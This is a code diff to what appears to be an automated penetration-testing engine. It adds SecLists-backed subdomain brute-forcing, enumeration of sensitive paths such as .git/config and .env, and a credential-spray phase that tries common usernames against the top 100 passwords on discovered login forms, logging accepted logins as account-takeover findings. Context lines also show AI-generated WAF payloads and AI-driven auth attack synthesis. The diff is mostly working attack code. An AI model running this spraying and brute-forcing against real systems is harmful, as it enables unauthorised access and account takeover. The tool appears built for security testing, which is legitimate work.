@@ -13,6 +13,7 @@ import { MemoryManager } from './memory_manager.js';
 import { SessionVault, SessionScopeError } from './session_vault.js';
 import { AuthFlowVault } from './auth_flow_vault.js';
 import { DEFAULT_HTTP_IDENTITY, defaultHttpIdentityHeaderArgs } from './user_agents.js';
+import { getSubdomains, getTopUsernames, getTopPasswords } from './seclists.js';
 import * as net from 'net';
 import * as tls from 'tls';
 import { AsyncLocalStorage } from 'async_hooks';
@@ -700,19 +701,21 @@ export class AutomationEngine {
             discoveredAssets.push(...subs);
           }
 
-          // Brute-force common subdomains
-          const commonSubdomains = ['admin', 'staging', 'dev', 'api', 'test', 'internal', 'corp', 'blog', 'status', 'docs', 'support', 'help', 'community', 'forum', 'beta', 'alpha', 'demo', 'sandbox', 'git', 'gitlab', 'jenkins', 'jira', 'confluence', 'slack', 'zoom', 'mail', 'webmail', 'smtp', 'pop', 'imap', 'ftp', 'sftp', 'ssh', 'vpn', 'remote', 'gateway', 'proxy', 'lb', 'loadbalancer', 'cdn', 'static', 'assets', 'images', 'media', 'video', 'audio', 'stream', 'download', 'upload', 'files', 'storage', 'backup', 'archive', 'old', 'new'];
+          // Brute-force common subdomains (SecLists-backed, parallel batches)
           const domainParts = hostname.split('.');
           const baseDomain = domainParts.length > 2 ? domainParts.slice(-2).join('.') : hostname;
-          
-          for (const sub of commonSubdomains) {
-            const subUrl = `https://${sub}.${baseDomain}`;
-            try {
-              const res = await axios.get(subUrl, { timeout: 2000, validateStatus: () => true });
-              if (res.status !== 404) {
-                discoveredAssets.push(subUrl);
-              }
-            } catch (e) {}
+          const subPrefixes = getSubdomains(200);
+          const subBatchSize = 30;
+          for (let i = 0; i < subPrefixes.length; i += subBatchSize) {
+            const batch = subPrefixes.slice(i, i + subBatchSize);
+            const results = await Promise.all(batch.map(async (sub) => {
+              const subUrl = `https://${sub}.${baseDomain}`;
+              try {
+                const res = await axios.get(subUrl, { timeout: 2000, validateStatus: () => true });
+                return res.status !== 404 ? subUrl : null;
+              } catch { return null; }
+            }));
+            for (const r of results) if (r) discoveredAssets.push(r);
           }
         } catch (e) {}
 
@@ -889,38 +892,30 @@ export class AutomationEngine {
           await browser.close();
         }
 
-        // Directory Brute-forcing across ALL assets
-        this.log(jobId, 'info', 'Strategy 2: Multi-Asset Content Discovery (ffuf polyfill)');
-        const commonDirs = [
-          'admin', 'api', 'v1', 'v2', 'graphql', 'config', 'login', 'dashboard', 'debug', 'internal', 'metrics', '.env', 'phpinfo',
-          'api/auth/login', 'api/auth/google', 'api/auth/session', 'api/users/me', 'api/teams', 'api/projects', 'api/files',
-          '.git/config', '.git/HEAD', '.env', '.vscode/sftp.json', '.well-known/security.txt', 'sitemap.xml'
-        ];
-        
+        // Directory Brute-forcing across ALL assets (SecLists-backed, parallel batches)
+        this.log(jobId, 'info', 'Strategy 2: Multi-Asset Content Discovery (SecLists common.txt)');
+
         for (const asset of discoveredAssets.slice(0, 5)) {
           try {
             const origin = new URL(asset).origin;
-            const hostname = new URL(asset).hostname;
+            const assetHostname = new URL(asset).hostname;
             await this.checkWildcard200(origin);
 
-            for (const dir of commonDirs) {
-              try {
-                const url = `${origin}/${dir}`;
-                const res = await axios.get(url, { 
-                  timeout: 2000, 
-                  validateStatus: () => true,
-                  headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36' }
-                });
-                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
-
-                if (res.status === 200 && !this.isWildcardResponse(hostname, body)) {
-                  this.log(jobId, 'info', `Discovered hidden endpoint: ${url} [${res.status}]`);
-                  endpoints.push({ url, method: 'GET' });
-                } else if (res.status !== 404 && res.status !== 200) {
-                  this.log(jobId, 'info', `Potential interesting endpoint: ${url} [${res.status}]`);
-                  endpoints.push({ url, method: 'GET' });
-                }
-              } catch (e) {}
+            const pathResult = await ToolManager.polyfillPathEnumeration(origin, 250);
+            if (pathResult?.stdout) {
+              for (const line of pathResult.stdout.split('\n').filter(Boolean)) {
+                try {
+                  const entry = JSON.parse(line) as { url: string; status: number; bodyLen: number };
+                  const body = '';
+                  if (entry.status === 200 && !this.isWildcardResponse(assetHostname, body)) {
+                    this.log(jobId, 'info', `Discovered hidden endpoint: ${entry.url} [${entry.status}]`);
+                    endpoints.push({ url: entry.url, method: 'GET' });
+                  } else if (entry.status !== 404 && entry.status !== 200) {
+                    this.log(jobId, 'info', `Potential interesting endpoint: ${entry.url} [${entry.status}]`);
+                    endpoints.push({ url: entry.url, method: 'GET' });
+                  }
+                } catch {}
+              }
             }
           } catch (e) {}
         }
@@ -3134,9 +3129,77 @@ Return JSON: { "payloads": [{ "name": string, "value": string, "target_waf": str
           } catch {}
         }
 
-        // 4h-5: AI-driven auth chain synthesis
+        // 4h-5: Credential spray against discovered login forms
+        this.log(jobId, 'info', 'Phase 4h-5: Credential spray (SecLists top-usernames × top-100 passwords)');
+        const loginEndpoints = endpoints.filter((ep: { url: string; method?: string }) =>
+          /login|signin|sign-in|authenticate|auth\/token|session/i.test(ep.url)
+        );
+        const sprayUsernames = getTopUsernames();
+        const sprayPasswords = getTopPasswords(100);
+
+        for (const ep of loginEndpoints.slice(0, 3)) {
+          if (authCount >= 15) break;
+          const origin = new URL(ep.url).origin;
+          const sprayHost = new URL(ep.url).hostname;
+          this.log(jobId, 'info', `Spraying ${ep.url} (${sprayUsernames.length} users × ${sprayPasswords.length} passwords)`);
+
+          // Baseline: send a known-bad login to capture the "failure" signal
+          let baselineStatus = 0;
+          let baselineBodySnippet = '';
+          try {
+            const baseRes = await axios.post(ep.url, {
+              username: `__levarg_baseline_${Date.now()}`,
+              password: `__levarg_baseline_${Date.now()}`,
+            }, { timeout: 5000, validateStatus: () => true });
+            baselineStatus = baseRes.status;
+            const baseBody = typeof baseRes.data === 'string' ? baseRes.data : JSON.stringify(baseRes.data);
+            baselineBodySnippet = baseBody.slice(0, 256);
+          } catch { continue; }
+
+          let sprayHit = false;
+          for (const user of sprayUsernames) {
+            if (sprayHit || authCount >= 15) break;
+            for (const pass of sprayPasswords) {
+              if (sprayHit || authCount >= 15) break;
+              try {
+                const res = await axios.post(ep.url, { username: user, password: pass }, {
+                  timeout: 5000, validateStatus: () => true, maxRedirects: 0,
+                });
+                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
+
+                // Success signal: status differs from baseline AND no error keywords
+                const statusDiffers = res.status !== baselineStatus;
+                const bodyDiffers = body.slice(0, 256) !== baselineBodySnippet;
+                const noErrorMarker = !/invalid|incorrect|wrong|denied|fail/i.test(body.slice(0, 512));
+                const isRedirect = res.status >= 300 && res.status < 400;
+
+                if ((statusDiffers && noErrorMarker) || isRedirect) {
+                  if (bodyDiffers || isRedirect) {
+                    this.log(jobId, 'vuln', `CREDENTIAL SPRAY HIT: ${user}:*** at ${ep.url} [${res.status}]`);
+                    MemoryManager.addFinding(jobId, sprayHost, {
+                      type: 'Auth Vulnerability', subtype: 'Default credential accepted',
+                      endpoint: ep.url,
+                      gap: `Server accepted default/common credential for user "${user}" — verify manually before reporting`,
+                      chain_potential: 'Account takeover → full application access',
+                      severity: 'CRITICAL',
+                      details: { username: user, response_status: res.status },
+                    });
+                    authCount++;
+                    sprayHit = true;
+                  }
+                }
+
+                // Rate-limit: 1 request per second per host
+                await new Promise(r => setTimeout(r, 1000));
+              } catch { /* network error — skip this combo */ }
+            }
+          }
+        }
+        this.log(jobId, 'info', `Phase 4h-5 complete: ${authCount} auth issue(s) total`);
+
+        // 4h-6: AI-driven auth chain synthesis
         if (ai && authCount > 0) {
-          this.log(jobId, 'info', 'Phase 4h-5: AI auth vulnerability synthesis');
+          this.log(jobId, 'info', 'Phase 4h-6: AI auth vulnerability synthesis');
           const authMemory = MemoryManager.getMemory(jobId, hostname);
           const authFindings = authMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Auth Vulnerability');
 
